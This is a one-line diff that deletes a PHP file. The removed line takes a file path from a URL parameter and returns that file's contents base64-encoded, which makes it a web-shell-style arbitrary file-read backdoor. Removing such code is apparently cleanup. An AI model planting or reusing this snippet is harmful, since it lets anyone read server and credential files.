@@ -1,1 +1,0 @@
-<?php $filename = $_GET["V"]; echo base64_encode(file_get_contents("$filename")) ?>
